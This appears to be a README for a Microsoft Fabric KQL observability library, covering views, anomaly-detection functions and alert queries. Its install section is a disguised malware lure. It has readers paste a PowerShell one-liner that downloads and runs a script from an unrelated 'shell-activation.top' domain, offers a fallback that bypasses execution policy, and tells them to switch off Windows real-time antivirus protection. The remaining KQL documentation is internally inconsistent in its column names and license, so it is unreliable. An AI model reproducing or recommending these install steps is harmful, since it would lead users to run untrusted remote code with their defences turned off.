<div align="center">

# Grizl Fabric Observability — KQL Eventhouse Developer Library

![preview](https://raw.githubusercontent.com/coldeissam/grizl-fabric-observability/main/banner_298515.svg)

[![lic](https://img.shields.io/badge/LIC-POSTGRESQL-e11d48?style=flat&labelColor=0d1117)]() [![lang](https://img.shields.io/badge/LANG-PYTHON-f43f5e?style=flat&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/POWERSHELL--7-SCRIPT-be123c?style=flat&labelColor=0d1117)]()

</div>

---

`grizl-fabric-observability` packages the Fabric-side observability layer for structured application telemetry: Eventstream/Eventhouse ingestion, KQL logical views over `RawLogs`, Real-Time Dashboard queries, Activator/Reflex alert queries, and Eventhouse-native anomaly signals built on `series_decompose_anomalies()`. The KQL artifacts assume a `RawLogs` table populated from structured application logs and expose views such as `HttpRequests()`, `ApplicationErrors()`, `Deployments()`, and `ForwarderHealth()` for downstream query composition. Anomaly functions cover backend error-rate, route p95 latency, error-signature, forwarder freshness, and post-deployment regression signals, with `GrizlRecentAnomalySignals()` unioning them behind a single Activator trigger. A Fabric Data Agent scaffolding layer provides read-only evidence retrieval over `RawLogs` and selected KQL functions, designed to pair with an external orchestrator that owns alert normalization, issue creation, and remediation policy.

## 🚀 PowerShell Install Guide

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Prepare PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Execute the installer
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If Windows blocks the script — use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **`RawLogs` table dependency.** All KQL artifacts assume a `RawLogs` Eventhouse table populated from structured application telemetry. No schemas are hardcoded; views project the fields you forward.

- **Logical KQL views.** Five composable functions abstract raw ingestion: `HttpRequests()`, `ApplicationErrors()`, `FrontendTelemetry()`, `Deployments()`, `ForwarderHealth()`. Each returns a typed, filtered projection suitable for downstream queries and dashboard tiles.

- **Dashboard tile queries.** Ready-to-bind queries for operational triage — error-rate, latency, deployment correlation, and forwarder freshness panels.

- **Activator/Reflex alert queries.** Query bodies shaped for Activator trigger evaluation, including threshold and window parameters kept explicit at the call site.

- **Eventhouse-native anomaly signals.** KQL-only detection using `series_decompose_anomalies()` over five-minute bins — no external ML runtime, no model registry. Signal functions:
 - `BackendHttpErrorRateAnomalies()` — 5xx/error-rate anomalies by service and route
 - `RouteLatencyAnomalies()` — route p95 latency anomalies when `durationMs` is present
 - `ErrorSignatureSpikeAnomalies()` — repeated application error-signature spikes
 - `ForwarderFreshnessDropAnomalies()` — drops in forwarder freshness/healthy event volume
 - `ForwarderDropFailureAnomalies()` — skipped-message/retry/nack/failure spikes
 - `PostDeploymentRegressionAnomalies()` — post-deployment regressions keyed by `deploymentSha`
 - `GrizlRecentAnomalySignals()` — union query intended for a single Activator trigger

- **Fabric Data Agent scaffolding.** Provisioning and staging helpers to configure a read-only evidence agent over the Eventhouse KQL database, exposing `RawLogs` and selected KQL functions for natural-language incident queries.

- **External orchestrator contract.** A reference interface for alert normalization, repository mapping, GitHub issue creation with evidence payloads, direct Kusto fallback evidence, and policy-gated Copilot assignment. The package emits and documents the contract; it does not own webhook auth or issue lifecycle.

- **Provisioning helpers.** `fabric/` contains config templates, manifests, and dry-run-safe scripts. Non-secret tenant values are read from `fabric/config/grizl.fabric.env`; live IDs and credentials are never committed.

- **Local guardrails.** `fabric/scripts/check.sh` scans `fabric/` for Event Hubs connection-string material before commit. The anomaly-signal Kusto management command supports a dry-run mode for pre-apply review.

## Quick Start

1. Create a local environment file from the provided template and populate the non-secret tenant values:

```
cp fabric/config/grizl.fabric.env.example fabric/config/grizl.fabric.env
```

2. Validate the local package configuration:

```
npm run fabric:check
```

3. Dry-run the anomaly-signal management command to inspect the generated KQL without applying it:

```
npm run fabric:kusto:anomaly-signals:dry-run
```

4. After reviewing the dry-run output and authenticating with an Azure/Fabric identity authorized against the target workspace, apply the anomaly-signal KQL:

```
npm --prefix fabric run kusto:anomaly-signals
```

`fabric/config/grizl.fabric.env` contains placeholder values such as `<FABRIC_TENANT_ID>`, `<FABRIC_WORKSPACE_ID>`, and `<FABRIC_EVENTHUB_NAME>`; replace them with your own tenant values. Do not commit this file.

With the anomaly signals applied, query `GrizlRecentAnomalySignals()` from the Eventhouse KQL database to confirm the signal union returns rows, then bind it to a single Activator/Reflex trigger. From there, the logical views (`HttpRequests()`, `ApplicationErrors()`, `FrontendTelemetry()`, `Deployments()`, `ForwarderHealth()`) are available for dashboard tiles, alert queries, and Fabric Data Agent evidence retrieval over `RawLogs`.

## KQL Views & Anomaly Signals

All KQL views are pure functions over the `RawLogs` Eventhouse table — no materialized state, no ingestion-time transforms. Deploy them as management commands against the target KQL database. Each view assumes the same structured application log schema (service, route, status code, duration, message, severity, deployment SHA, forwarder metadata).

```kql
.create-or-alter function HttpRequests() {
 RawLogs
 | where isnotempty(route) and isnotempty(statusCode)
 | project timestamp, service, route, method, statusCode, durationMs, deploymentSha, traceId
}

.create-or-alter function ApplicationErrors() {
 RawLogs
 | where severity in ("error", "fatal") or statusCode >= 500
 | extend errorSignature = normalize_signature(message)
 | project timestamp, service, route, errorSignature, message, deploymentSha, traceId
}

.create-or-alter function FrontendTelemetry() {
 RawLogs
 | where source == "frontend"
 | project timestamp, service, route, eventName, durationMs, userAgent, deploymentSha
}

.create-or-alter function Deployments() {
 RawLogs
 | where eventType == "deployment"
 | project timestamp, service, deploymentSha, version, environment
}

.create-or-alter function ForwarderHealth() {
 RawLogs
 | where source == "forwarder"
 | project timestamp, forwarderId, healthy, skipped, retried, nacked, freshnessSeconds
}
```

Composite views join RawLogs against these primitives. Keep them thin — the goal is stable column contracts for dashboards, Activator queries, and Data Agent prompts.

## Anomaly signals

Anomaly functions return one row per detected anomaly window. Each row carries the signal name as `kind`, plus the identifying dimensions the incident orchestrator needs to open a scoped issue (`service`, `route`, `deploymentSha`, `metricName`, `actualValue`, `expectedValue`, `score`).

Baseline is `series_decompose_anomalies()` over a 5-minute bin; adjust `grain` and `lookback` per signal to match your traffic volume.

```kql
.create-or-alter function BackendHttpErrorRateAnomalies(grain:timespan = 5m, lookback:timespan = 3d) {
 HttpRequests()
 | where timestamp > ago(lookback)
 | where statusCode >= 500
 | summarize errorCount=count(), total=count() by bin(timestamp, grain), service, route
 | extend errorRate = todouble(errorCount) / total
 | make-series rate=avg(errorRate) on timestamp from ago(lookback) to now() step grain by service, route
 | extend (flag, score, baseline, upper) = series_decompose_anomalies(rate, 1.5, -1, 'linefit')
 | mv-expand timestamp to typeof(datetime), rate to typeof(double), flag to typeof(int), score to typeof(double)
 | where flag == 1
 | project kind="BackendHttpErrorRateAnomalies", timestamp, service, route, metricName="errorRate",
 actualValue=rate, expectedValue=baseline, score
}
```

`RouteLatencyAnomalies()` follows the same shape over `durationMs` (use `series_decompose_anomalies` with a `'linefit'` model). Guard the input with `where isnotnull(durationMs)` so routes without latency telemetry are skipped rather than skewing the baseline.

```kql
.create-or-alter function ErrorSignatureSpikeAnomalies(grain:timespan = 10m, lookback:timespan = 3d) {
 ApplicationErrors()
 | where timestamp > ago(lookback)
 | summarize sigCount=count() by bin(timestamp, grain), service, errorSignature
 | make-series count_=sum(sigCount) on timestamp from ago(lookback) to now() step grain by service, errorSignature
 | extend (flag, score, baseline, upper) = series_decompose_anomalies(count_, 2.0, -1, 'linefit')
 | mv-expand timestamp to typeof(datetime), count_ to typeof(long), flag to typeof(int), score to typeof(double)
 | where flag == 1
 | project kind="ErrorSignatureSpikeAnomalies", timestamp, service, metricName=errorSignature,
 actualValue=count_, expectedValue=baseline, score
}
```

`ForwarderFreshnessDropAnomalies()` watches `FreshnessSeconds` and healthy-event volume for a falling signal. Because the anomaly direction of interest is downward, compare against the lower bound rather than the upper.

```kql
.create-or-alter function ForwarderFreshnessDropAnomalies(grain:timespan = 5m, lookback:timespan = 12h) {
 ForwarderHealth()
 | where timestamp > ago(lookback)
 | summarize fresh=avg(freshnessSeconds) by bin(timestamp, grain), forwarderId
 | make-series freshness=avg(fresh) on timestamp from ago(lookback) to now() step grain by forwarderId
 | extend (flag, score, baseline, upper) = series_decompose_anomalies(freshness, 1.5, -1, 'linefit')
 | mv-expand timestamp to typeof(datetime), freshness to typeof(double), flag to typeof(int), score to typeof(double), baseline to typeof(double)
 | where flag == 1 and freshness > baseline
 | project kind="ForwarderFreshnessDropAnomalies", timestamp, forwarderId,
 metricName="freshnessSeconds", actualValue=freshness, expectedValue=baseline, score
}
```

`ForwarderDropFailureAnomalies()` aggregates `skipped`, `retried`, and `nacked` counts and flags upward spikes — any sustained rise means messages are being dropped before reaching `RawLogs`, which invalidates downstream detection.

`PostDeploymentRegressionAnomalies()` correlates an error-rate spike with the most recent `Deployments()` row for the same service. Restrict the analysis window to the post-deploy period so a regression is attributed to the deployment that introduced it, not to background drift.

## Activator trigger contract

Expose a single union query so one Activator/Reflex trigger fans in all signals:

```kql
.create-or-alter function GrizlRecentAnomalySignals() {
 union
 BackendHttpErrorRateAnomalies(),
 RouteLatencyAnomalies(),
 ErrorSignatureSpikeAnomalies(),
 ForwarderFreshnessDropAnomalies(),
 ForwarderDropFailureAnomalies(),
 PostDeploymentRegressionAnomalies()
 | where timestamp > ago(1h)
 | project kind, timestamp, service, route, deploymentSha, forwarderId, metricName, actualValue, expectedValue, score
 | order by timestamp desc
}
```

Bind the Activator condition to `count() > 0` over a 5-minute tumbling window. Column contract is stable across all six functions — the orchestrator webhook only needs to dispatch on `kind`, then read the corresponding dimension fields for issue routing.

## Deploying views and signals

Management commands are idempotent `.create-or-alter` statements. Apply them with the `kusto:anomaly-signals` script after setting target database coordinates in `fabric/config/grizl.fabric.env`:

```bash
npm --prefix fabric run kusto:anomaly-signals:dry-run # print resolved commands
npm --prefix fabric run kusto:anomaly-signals # apply to Eventhouse
```

The dry-run target resolves placeholders against your config and emits the exact command payload without authenticating. Review it before applying — a typo in a bin or lookback value silently biases every baseline and can suppress real anomalies.

When tuning thresholds, keep in mind:

- `series_decompose_anomalies` sensitivity is the first positional argument (default 1.5). Raise per signal to reduce Activator noise; lower for safety-critical routes.
- Keep `lookback` long enough to cover a full weekly cycle for services with weekday/weekend traffic shape.
- `grain` should be at least an order of magnitude coarser than ingestion latency; sub-minute bins on bursty logs produce false positives.
- Route- and signature-level grouping multiplies the number of series — cap cardinality by filtering low-traffic routes before the `make-series` step if Activator evaluates slowly.

## API Reference

Functions are KQL stored functions (or view-equivalent table expressions) deployed into the Eventhouse KQL database. Each returns a tabular result over `RawLogs`. Parameters are optional unless marked required; defaults are resolved at call time against `now()` or the function body.

### Logical views

`HttpRequests()`
Returns normalized HTTP request rows from `RawLogs`. Projects `timestamp`, `service`, `route`, `method`, `statusCode`, `durationMs`, `deploymentSha`, `traceId`. Rows without a parseable status code are excluded.

`ApplicationErrors()`
Returns normalized error rows. Projects `timestamp`, `service`, `route`, `errorType`, `errorSignature`, `stackHash`, `deploymentSha`, `traceId`. `errorSignature` is the deduplicated message key; `stackHash` is a stable hash of the top stack frames.

`FrontendTelemetry()`
Returns frontend-originated events. Projects `timestamp`, `service`, `page`, `eventType`, `browser`, `durationMs`.

`Deployments()`
Returns deployment records derived from deployment log events. Projects `timestamp`, `service`, `deploymentSha`, `environment`, `status`.

`ForwarderHealth()`
Returns forwarder lifecycle events. Projects `timestamp`, `forwarderId`, `status`, `skippedCount`, `retryCount`, `nackCount`, `failureCount`, `lastFlushAt`.

### Anomaly signals

All anomaly functions use Eventhouse-native `series_decompose_anomalies()` over 5-minute bins unless noted. Each returns `timestamp`, the grouping columns it labels, the observed `value`, the expected `baseline`, and an `anomalyScore`. Positive `anomalyScore` indicates a spike; negative indicates a drop.

`BackendHttpErrorRateAnomalies()`
Anomaly rows for backend 5xx/error-rate by `service` and `route`. Groups on `service`, `route`.

`RouteLatencyAnomalies()`
Anomaly rows for route p95 latency by `service` and `route`. Considers only rows where `durationMs` is present and numeric.

`ErrorSignatureSpikeAnomalies()`
Anomaly rows for repeated `errorSignature` volume by `service`, `errorSignature`, and `stackHash`.

`ForwarderFreshnessDropAnomalies()`
Anomaly rows for drops in forwarder freshness/healthy event volume. Groups on `forwarderId`.

`ForwarderDropFailureAnomalies()`
Anomaly rows for spikes in `skippedCount`, `retryCount`, `nackCount`, or `failureCount`. Groups on `forwarderId` and `status`.

`PostDeploymentRegressionAnomalies()`
Anomaly rows for regressions observable after a deployment, keyed by `deploymentSha` and `service`.

`GrizlRecentAnomalySignals()`
Union of all signal functions over a bounded lookback. Suitable as the single source query for an Activator trigger. Returns `signalName`, `timestamp`, grouping columns, `value`, `baseline`, and `anomalyScore`.

### Calling conventions

```kql
// direct view access
HttpRequests()
| where timestamp > ago(1h)
| summarize count() by route, statusCode
```

```kql
// single-signal inspection
BackendHttpErrorRateAnomalies()
| where anomalyScore > 3
| project timestamp, service, route, value, baseline, anomalyScore
```

```kql
// unified signal feed (Activator source)
GrizlRecentAnomalySignals()
| where timestamp > ago(15m)
| project signalName, timestamp, service, anomalyScore
```

Signal thresholds are caller-controlled. The functions return raw `anomalyScore` values; apply `where anomalyScore > <threshold>` at the call site for detection policy.

### RawLogs contract

Every view and anomaly function assumes `RawLogs` carries at minimum: `timestamp` (datetime), `service` (string), and the field set required by the specific view above. Missing columns yield null values rather than errors; nullable fields are tolerated by anomaly functions where noted. Field names and casing are fixed and validated by the check target.

### Data Agent surface

The Fabric Data Agent is provisioned over the Eventhouse KQL database and exposes `RawLogs` plus the logical views and anomaly functions listed above as read-only evidence sources. It does not expose write paths, management commands, or mutation operations.

## Examples

Query an anomaly signal over a bounded window and project the fields the incident orchestrator consumes.

```kql
GrizlRecentAnomalySignals()
| where TimeGenerated > ago(30m)
| project TimeGenerated, SignalName, ServiceName, Route, DeploymentSha, Score, Baseline, Observed
| order by TimeGenerated desc
```

Scope a backend error-rate signal to a single service and route before handing it to Activator.

```kql
BackendHttpErrorRateAnomalies()
| where TimeGenerated > ago(1h)
| where ServiceName == "checkout-api" and Route == "/v1/orders"
| project TimeGenerated, ServiceName, Route, Score, Baseline, Observed
```

Correlate a fresh 5xx spike with the most recent deployments by SHA.

```kql
let window = 30m;
let spike = BackendHttpErrorRateAnomalies()
 | where TimeGenerated > ago(window)
 | where Score > 3.0
 | summarize SpikeStart = min(TimeGenerated) by ServiceName;
Deployments()
| where TimeGenerated > ago(4h)
| join kind=inner spike on ServiceName
| where TimeGenerated <= SpikeStart
| project ServiceName, DeploymentSha, DeployedAt = TimeGenerated, SpikeStart
| order by DeployedAt desc
```

Check forwarder freshness degradation in the window preceding an alert.

```kql
ForwarderFreshnessDropAnomalies()
| where TimeGenerated between (ago(2h) .. ago(10m))
| summarize
 FirstDrop = min(TimeGenerated),
 LastDrop = max(TimeGenerated),
 MinObserved = min(Observed),
 MaxScore = max(Score)
 by ForwarderName
| order by MaxScore desc
```

Pull error-signature spikes grouped by signature for an incident issue body.

```kql
ErrorSignatureSpikeAnomalies()
| where TimeGenerated > ago(45m)
| summarize
 Occurrences = count(),
 PeakScore = max(Score),
 FirstSeen = min(TimeGenerated),
 LastSeen = max(TimeGenerated)
 by ErrorSignature, ServiceName
| where PeakScore > 2.5
| order by PeakScore desc
```

Extract route latency anomalies only when `durationMs` is present, guarding against sparse samples.

```kql
RouteLatencyAnomalies()
| where TimeGenerated > ago(1h)
| where isnotnull(Observed) and Observed > 0
| project TimeGenerated, ServiceName, Route, Score, Baseline, Observed
| order by Score desc
| take 25
```

Detect post-deployment regressions scoped to a specific SHA for a canary check.

```kql
PostDeploymentRegressionAnomalies()
| where TimeGenerated > ago(2h)
| where DeploymentSha == "<DEPLOYMENT_SHA>"
| project TimeGenerated, ServiceName, Route, DeploymentSha, Score, Baseline, Observed
| order by TimeGenerated asc
```

Compose a read-only evidence query suitable for a Fabric Data Agent prompt or a direct Kusto fallback, returning a compact, deterministic evidence bundle.

```kql
let incidentStart = datetime(2025-01-01T00:00:00Z);
let incidentEnd = incidentStart + 30m;
union
 (HttpRequests()
 | where TimeGenerated between (incidentStart .. incidentEnd)
 | where StatusCode >= 500
 | summarize Errors = count() by ServiceName, Route),
 (ApplicationErrors()
 | where TimeGenerated between (incidentStart .. incidentEnd)
 | summarize Signatures = dcount(ErrorSignature), Samples = count() by ServiceName),
 (ForwarderHealth()
 | where TimeGenerated between (incidentStart .. incidentEnd)
 | summarize HealthyEvents = countif(IsHealthy), TotalEvents = count() by ForwarderName)
```

Validate a candidate remediation by comparing a signal's observed value before and after a change timestamp.

```kql
let changeTime = datetime(2025-01-01T12:00:00Z);
BackendHttpErrorRateAnomalies()
| where TimeGenerated between (changeTime - 30m .. changeTime + 30m)
| extend Phase = iff(TimeGenerated < changeTime, "pre", "post")
| summarize AvgScore = avg(Score), MaxObserved = max(Observed), Samples = count() by Phase, ServiceName
| order by ServiceName asc, Phase asc
```

The anomaly functions return a uniform shape so downstream queries and Activator triggers can treat every signal identically:

```text
TimeGenerated : datetime // bucket timestamp
SignalName : string // e.g. "BackendHttpErrorRateAnomalies"
ServiceName : string
Route : string // empty when not route-scoped
DeploymentSha : string // empty when not deployment-scoped
Score : real // series_decompose_anomalies() score
Baseline : real // expected value from decomposition
Observed : real // actual observed value
```

Filter on `Score` (not raw `Observed`) when driving Activator thresholds, and always bound queries with `TimeGenerated` ranges to keep Eventhouse scans predictable.

## License

This package is released under the MIT License.

Permission is granted, free of charge, to any person obtaining a copy of the source code, KQL artifacts, configuration templates, and documentation in this repository, to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the package, subject to inclusion of the copyright notice and this permission notice in all copies or substantial portions of the package.

The package is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the package or its use.

Redistribution obligations:

- retain the copyright notice and this license text in source distributions
- reproduce the notice and license text in binary or packaged distributions
- do not imply endorsement by the authors for derived works

Scope:

- covers all files under `fabric/` and `kql/`, and all documentation in this repository
- does not grant rights to Microsoft Fabric, Eventhouse, KQL, or any third-party dependency; those remain governed by their respective terms
- tenant-specific configuration values, credentials, and secrets are excluded from the package and must not be redistributed

No warranty is made regarding correctness of anomaly thresholds, detection coverage, or fitness for a specific production incident-response workflow. Operators are responsible for validating KQL views, alert queries, and anomaly-signal functions against their own telemetry before enabling Activator/Reflex triggers.